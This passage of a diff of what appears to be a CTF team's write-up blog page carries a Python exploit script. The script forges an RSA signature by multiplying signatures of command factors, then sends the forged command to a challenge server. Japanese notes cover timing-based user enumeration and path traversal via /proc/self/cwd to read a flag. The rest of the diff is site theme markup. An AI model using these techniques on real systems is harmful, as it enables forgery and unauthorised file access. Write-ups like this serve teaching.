-    <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Signature: ([\da-f]+)&#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
-    <span class="mi">16</span>
-<span class="p">)</span>
+signature_2 = int(
+    re.search('Signature: ([\da-f]+)', s.recv(4096).decode(&quot;utf-8&quot;)).group(1),
+    16
+)
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;signature_2: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">signature_2</span><span class="p">))</span>
+print(&quot;signature_2: &quot; + str(signature_2))
 
-<span class="c1"># Get `half_command` signature</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
+# Get `half_command` signature
+s.sendall(b'1\n')
+print(s.recv(1024).decode(&quot;utf-8&quot;))
 
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span>
-    <span class="n">half_command</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="n">half_command</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">signed</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
-<span class="p">)</span>
+s.sendall(
+    half_command.to_bytes((half_command.bit_length() + 7) , byteorder='big', signed=False) + b'\n'
+)
 
-<span class="n">signature_half_command</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span>
-    <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Signature: ([\da-f]+)&#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
-    <span class="mi">16</span>
-<span class="p">)</span>
+signature_half_command = int(
+    re.search('Signature: ([\da-f]+)', s.recv(4096).decode(&quot;utf-8&quot;)).group(1),
+    16
+)
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;signature half command: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">signature_half_command</span><span class="p">))</span>
+print(&quot;signature half command: &quot; + str(signature_half_command))
 
-<span class="c1"># Calculate signature</span>
-<span class="n">signature_command</span> <span class="o">=</span> <span class="n">signature_half_command</span> <span class="o">*</span> <span class="n">signature_2</span> <span class="o">%</span> <span class="n">N</span>
+# Calculate signature
+signature_command = signature_half_command * signature_2 % N
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;GOOOOOOOOOOOOOOOOOO&#34;</span><span class="p">)</span>
+print(&quot;GOOOOOOOOOOOOOOOOOO&quot;)
 
-<span class="c1"># Execute command</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1337,F</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
-<span class="n">sig</span> <span class="o">=</span> <span class="p">(</span><span class="n">format</span><span class="p">(</span><span class="n">signature_command</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
+# Execute command
+s.sendall(b'2\n')
+print(s.recv(1024).decode(&quot;utf-8&quot;))
+s.sendall(b'1337,F\n')
+print(s.recv(1024).decode(&quot;utf-8&quot;))
+sig = (format(signature_command, 'x')).encode(&quot;ascii&quot;)
 
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">sig</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
+s.sendall(sig + b'\n\n')
 
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="web">Web</h2>
+print(s.recv(2024).decode(&quot;utf-8&quot;))
+</code></pre>
+<h2 id="web">Web</h2>
 <h3 id="spy">Spy</h3>
 <p>ユーザの有無でサーバの応答時間が変わるので、全ユーザー試して列挙。</p>
 <h3 id="tweetstore">Tweetstore</h3>
@@ -953,34 +719,295 @@ someoneでuid:adminを指定してリクエストすると、adminのTokenが参
 <h3 id="readme">readme</h3>
 <p>/proc/self/environでpwdが/home/ctf/serverとわかるので、/proc/self/cwd/../flagを渡し、相対パスでアクセス。</p>
 
-                    </div>
-                    
-                </section>
+    </div>
+</article>
+
+
+
+
             </div>
-            <div class="footer">
-    <div class="pure-menu pure-menu-horizontal pure-menu-open">
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
         <ul>
-            <li>Powered by <a class="hugo" href="https://gohugo.io/" target="_blank">hugo</a></li>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/books/">Publication</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
         </ul>
     </div>
-</div>
-<script src='//blog.urandom.team/js/all.min.js'></script>
-
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/ctf/">CTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/e-book/">E-book</a>
+            </span>
+            
+            <span>
+                <a href="/tags/misc/">Misc</a>
+            </span>
+            
+            <span>
+                <a href="/tags/publication/">Publication</a>
+            </span>
+            
+            <span>
+                <a href="/tags/seccon/">SECCON</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tech/">tech</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tmctf/">TMCTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/write-ups/">Write-ups</a>
+            </span>
+            
         </div>
     </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>Table of Contents</h3><nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#beginners-stack">Beginner&rsquo;s Stack</a></li>
+        <li><a href="#beginners-heap">Beginner&rsquo;s Heap</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#rb">R&amp;B</a></li>
+        <li><a href="#noisy-equations">Noisy equations</a></li>
+        <li><a href="#rsa-calc">RSA Calc</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#spy">Spy</a></li>
+        <li><a href="#tweetstore">Tweetstore</a></li>
+        <li><a href="#unzip">unzip</a></li>
+        <li><a href="#profiler">profiler</a></li>
+      </ul>
+    </li>
+    <li><a href="#reversing">Reversing</a>
+      <ul>
+        <li><a href="#mask">mask</a></li>
+        <li><a href="#yakisoba">yakisoba</a></li>
+        <li><a href="#ghost">ghost</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#welcome">Welcome</a></li>
+        <li><a href="#emoemoencode">emoemoencode</a></li>
+        <li><a href="#readme">readme</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+</aside>
+
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
 </div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/books/">Publication</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/ctf/">CTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/e-book/">E-book</a>
+            </span>
+            
+            <span>
+                <a href="/tags/misc/">Misc</a>
+            </span>
+            
+            <span>
+                <a href="/tags/publication/">Publication</a>
+            </span>
+            
+            <span>
+                <a href="/tags/seccon/">SECCON</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tech/">tech</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tmctf/">TMCTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/write-ups/">Write-ups</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>Table of Contents</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#beginners-stack">Beginner&rsquo;s Stack</a></li>
+        <li><a href="#beginners-heap">Beginner&rsquo;s Heap</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#rb">R&amp;B</a></li>
+        <li><a href="#noisy-equations">Noisy equations</a></li>
+        <li><a href="#rsa-calc">RSA Calc</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#spy">Spy</a></li>
+        <li><a href="#tweetstore">Tweetstore</a></li>
+        <li><a href="#unzip">unzip</a></li>
+        <li><a href="#profiler">profiler</a></li>
+      </ul>
+    </li>
+    <li><a href="#reversing">Reversing</a>
+      <ul>
+        <li><a href="#mask">mask</a></li>
+        <li><a href="#yakisoba">yakisoba</a></li>
+        <li><a href="#ghost">ghost</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#welcome">Welcome</a></li>
+        <li><a href="#emoemoencode">emoemoencode</a></li>
+        <li><a href="#readme">readme</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2015-2022
+                <a href="https://urandom.team">urandom</a>
+                All rights reserved.
+                 | <a href="https://github.com/urandom-ctf/urandom-ctf.github.io">Source code</a> 
+                | Powered by <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
 
 
-<script>
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
 
-ga('create', '', 'auto');
-ga('send', 'pageview');
+<script defer src="/assets/js/fuji.min.js"></script>
 
-</script>
+
 
 </body>
+
 </html>
